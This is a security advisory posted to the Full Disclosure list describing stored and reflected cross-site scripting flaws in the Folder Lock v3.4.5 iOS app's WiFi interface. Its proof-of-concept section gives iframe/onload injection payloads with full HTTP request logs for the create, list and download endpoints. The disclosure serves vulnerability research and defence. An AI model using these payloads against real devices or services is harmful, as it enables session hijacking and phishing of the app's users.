
Date: Mon, 20 Apr 2020 20:53:19 +0200
From: Vulnerability Lab <research@...nerability-lab.com>
To: fulldisclosure@...lists.org
Subject: [FD] Folder Lock v3.4.5 iOS - Multiple Web Vulnerabilities

Document Title:
===============
Folder Lock v3.4.5 iOS - Multiple Web Vulnerabilities


References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=2210


Release Date:
=============
2020-04-20


Vulnerability Laboratory ID (VL-ID):
====================================
2210


Common Vulnerability Scoring System:
====================================
4.2


Vulnerability Class:
====================
Multiple


Current Estimated Price:
========================
500€ - 1.000€


Product & Service Introduction:
===============================
Folder Lock lets you password-protect your personal files, photos,
videos, documents, contacts, wallet cards, notes and
audio recordings in your iPhone. Apart from being a perfect data
security app, Folder Lock is a perfect WiFi manager
app too, as you can transfer files from your iPhone to PC, or vice
versa, wireless via Folder Lock. Its WiFi Music Manager
feature allows you the options of audio import, music import, song
import and mp3 import without using iTunes.

(Copy of the Homepage:
https://apps.apple.com/us/app/folder-lock/id372925917 )


Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered multiple web
vulnerabilities in the official Folder Lock v3.4.5 mobile ios application.


Affected Product(s):
====================
NewSoftwares.net
Product: Folder Lock v3.4.5 - Apple iOS Mobile Web Application


Vulnerability Disclosure Timeline:
==================================
2020-04-20: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Authentication Type:
====================
No authentication (guest)


User Interaction:
=================
Low User Interaction


Disclosure Type:
================
Independent Security Research


Technical Details & Description:
================================
1.1
Multiple persistent cross site scripting vulnerability has been
discovered in the official Folder Lock v3.4.5 mobile ios application.
The vulnerability allows remote attackers to inject own malicious script
codes with persistent attack vector to compromise browser to
web-application requests from the application-side.

The persistent input validation vulnerability is located in the `create`
module with the `Create Folder` function. Remote attackers
are able to inject own malicious persistent script codes as path or
foldername. After the inject the code executes persistent from the
application-side. The request method to inject is POST and the attack
vector is located on the application-side. The injection point
is the create folder function and the execution point occurs with any
path/file index dir listing on preview.

Successful exploitation of the vulnerability results in session
hijacking, persistent phishing attacks, persistent external redirects
to malicious source and persistent manipulation of affected application
modules.

Request Method(s):
[+] POST

Vulnerable Function(s):
[+] Create Folder

Vulnerable Module(s):
[+] path



1.2
Multiple non-persistent cross site web vulnerabilities has been
discovered in the official Folder Lock v3.4.5 mobile ios application.
The vulnerability allows remote attackers to inject own malicious script
codes with non-persistent attack vector to compromise browser
to web-application requests from the client-side.

The non-persistent cross site scripting vulnerabilities are located in
the `path` parameter of the `list` and `download` module.
Remote attackers are able to inject own malicious script code to
client-side requests with non-persistent attack vector.
The request method to inject is GET and the attack vector is located on
the client-side. The injection point is the vulnerable
`path` parameter and the execution occurs in the not sanitized error
exception output message.

Successful exploitation of the vulnerability results in session
hijacking, non-persistent phishing attacks, non-persistent external
redirects to malicious source and non-persistent manipulation of
affected application modules.

Request Method(s):
[+] GET

Vulnerable Module(s):
[+] ./list
[+] ./download

Vulnerable Parameter(s):
[+] path


Proof of Concept (PoC):
=======================
1.1
The persistent input validation web vulnerability can be exploited by
remote attackers with wifi ui access with low user interaction.
For security demonstration or to reproduce the security vulnerability
follow the provided information and steps below to continue.


PoC: Vulnerable Source
<ol class="breadcrumb" id="path" style="cursor: pointer;"><li
data-path="/"><a>IOS-DEVICENAME</a></li><li data-path="/Audios/">
<a>Audios</a></li><li class="active">test"&gt;<iframe src="evil.source"
onload="alert(document.domain)"></li></iframe></li></ol>


--- PoC Session Logs (POST) --- [Create Folder]
http://localhost/create
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
Gecko/20100101 Firefox/75.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 89
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/
Cookie: _ga=GA1.4.376521534.1586884411; _gid=GA1.4.1374601525.1586884411
path=/Audios/test"><iframe src=evil.source onload=alert(document.domain)>
-
POST: HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Length: 2
Content-Type: application/json
Connection: Close
Server: GCDWebUploader
-
http://localhost/evil.source
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
Gecko/20100101 Firefox/75.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://localhost/
Cookie: _ga=GA1.4.376521534.1586884411; _gid=GA1.4.1374601525.1586884411
Upgrade-Insecure-Requests: 1
-
GET: HTTP/1.1 200 OK
Server: GCDWebUploader
Connection: Close


Reference(s):
http://localhost/create



1.2
The non-persistent cross site web vulnerabilities can be exploited by
remote attackers with wifi ui access with low user interaction.
For security demonstration or to reproduce the security vulnerability
follow the provided information and steps below to continue.


PoC: Vulnerable Source
<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>HTTP
Error 404</title></head><body><h1>
HTTP Error 404: <iframe src=evil.source onload=alert(document.domain)>
does not exist</h1><h3></h3></body></html>


--- PoC Session Logs (GET) --- [List Error Exception]
http://localhost/list?path=>"<iframe src=evil.source
onload=alert(document.domain)>
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
Gecko/20100101 Firefox/75.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: _ga=GA1.4.376521534.1586884411; _gid=GA1.4.1374601525.1586884411
-
GET: HTTP/1.1 200 OK
Content-Length: 237
Content-Type: text/html; charset=utf-8
Connection: Close
Server: GCDWebUploader
-
http://localhost/evil.source
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
Gecko/20100101 Firefox/75.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer:
http://localhost/list?path=%3E%22%3Ciframe%20src=evil.source%20onload=alert(document.domain)%3E
Cookie: _ga=GA1.4.376521534.1586884411; _gid=GA1.4.1374601525.1586884411
-
GET: HTTP/1.1 200 OK
Server: GCDWebUploader
Connection: Close
Date: Tue, 14 Apr 2020 17:53:23 GMT

--- PoC Session Logs (GET) --- [Download Error Exception]
http://localhost/download?path=>"<iframe src=evil.source
onload=alert(document.domain)>
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
Gecko/20100101 Firefox/75.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: _ga=GA1.4.376521534.1586884411; _gid=GA1.4.1374601525.1586884411
-
GET: HTTP/1.1 200 OK
Content-Length: 237
Content-Type: text/html; charset=utf-8
Connection: Close
Server: GCDWebUploader
-
http://localhost/evil.source
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
Gecko/20100101 Firefox/75.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer:
http://localhost/download?path=%3E%22%3Ciframe%20src=evil.source%20onload=alert(document.domain)%3E
Cookie: _ga=GA1.4.376521534.1586884411; _gid=GA1.4.1374601525.1586884411
-
GET: HTTP/1.1 200 OK
Server: GCDWebUploader
Connection: Close

References:
http://localhost/list?path=
http://localhost/download?path=


Security Risk:
==============
1.1
The security risk of the persistent validation web vulnerabilities in
creat folder function is estimated as medium.

1.2
The security risk of the client-side cross site scripting web
vulnerabilities in the path parameter is estimated as medium.


Credits & Authors:
==================
Vulnerability-Lab -
https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
Benjamin Kunz Mejri -
https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without
any warranty. Vulnerability Lab disclaims all warranties,
either expressed or implied, including the warranties of merchantability
and capability for a particular purpose. Vulnerability-Lab
or its suppliers are not liable in any case of damage, including direct,
indirect, incidental, consequential loss of business profits
or special damages, even if Vulnerability-Lab or its suppliers have been
advised of the possibility of such damages. Some states do
not allow the exclusion or limitation of liability for consequential or
incidental damages so the foregoing limitation may not apply.
We do not approve or encourage anybody to break any licenses, policies,
deface websites, hack into databases or trade with stolen data.

Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
www.vulnerability-db.com
Services:   magazine.vulnerability-lab.com
paste.vulnerability-db.com 			infosec.vulnerability-db.com
Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php
vulnerability-lab.com/rss/rss_upcoming.php
vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php
vulnerability-lab.com/register.php
vulnerability-lab.com/list-of-bug-bounty-programs.php

Any modified copy or reproduction, including partially usages, of this
file requires authorization from Vulnerability Laboratory.
Permission to electronically redistribute this alert in its unmodified
form is granted. All other rights, including the use of other
media, are reserved by Vulnerability-Lab Research Team or its suppliers.
All pictures, texts, advisories, source code, videos and other
information on this website is trademark of vulnerability-lab team & the
specific authors or managers. To record, list, modify, use or
edit our material contact (admin@ or research@) to get a ask permission.

				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
Security GmbH]™




-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/